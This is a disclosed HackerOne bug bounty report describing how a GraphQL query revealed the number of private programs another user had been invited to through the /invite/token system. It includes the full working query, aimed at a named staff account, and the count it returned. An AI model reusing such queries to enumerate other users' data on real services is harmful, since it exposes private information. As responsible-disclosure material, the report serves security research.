# The request tells the number of private programs, the new system of authorization /invite/token

## Report Details
- **Report ID**: 310946
- **URL**: https://hackerone.com/reports/310946
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-01-31T13:41:42.467Z
- **Disclosed**: 2018-02-14T09:25:56.318Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi team.
The old version of the invite program, looks simple. A link to the program in which you need to log in.Now this looks through token.So my PoC I think you can count work since you have changed the system to a new, token

**Description:**

### Steps To Reproduce

1. https://hackerone.com/graphql

POST:
`{"query":"query Directory_invitations_page($state_0:[InvitationStateEnum]!,$state_3:[InvitationStateEnum]!,$first_1:Int!,$size_2:ProfilePictureSizes!) {\\n`***user(username:\\\"jobert\\\")***` {\\n    id,\\n    ...F5\\n  }\\n}\\nfragment F0 on User {\\n  _soft_launch_invitations259p9N:soft_launch_invitations(state:$state_0,first:$first_1) {\\n    total_count\\n  },\\n  id\\n}\\nfragment F1 on InvitationsSoftLaunch {\\n  id,\\n  team {\\n    handle,\\n    url,\\n    name,\\n    about,\\n    bug_count,\\n    base_bounty,\\n    offers_bounties,\\n    currency,\\n    _profile_picture2rz4nb:profile_picture(size:$size_2),\\n    id\\n  },\\n  expires_at,\\n  state,\\n  token\\n}\\nfragment F2 on Node {\\n  id,\\n  __typename\\n}\\nfragment F3 on InvitationInterface {\\n  __typename,\\n  ...F1,\\n  ...F2\\n}\\nfragment F4 on User {\\n  _soft_launch_invitations1WD3Qk:soft_launch_invitations(state:$state_0,first:$first_1) {\\n    total_count,\\n    edges {\\n      node {\\n        id,\\n        ...F3\\n      },\\n      cursor\\n    },\\n    pageInfo {\\n      hasNextPage,\\n      hasPreviousPage\\n    }\\n  },\\n  _soft_launch_invitations2FRMOR:soft_launch_invitations(state:$state_3,first:$first_1) {\\n    total_count\\n  },\\n  id\\n}\\nfragment F5 on User {\\n  id,\\n  ...F0,\\n  ...F4\\n}","variables":{"state_0":["pending_terms","open","accepted"],"state_3":["pending_terms","open","accepted","cancelled","rejected"],"first_1":100,"size_2":"large"}}`


I take username:\\\"jobert\\\" , hi @jobert

`Result "total_count":27`

You have 27 private programs in which you have added through the new system - using /invite/token

Yes , most likely you have more number of private programs, but those that are missing, you most likely added by the old system.

Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00

F259145

## Impact

total count Private programs in order to add the system /invite/token

## Attachments
- asdqwe.png
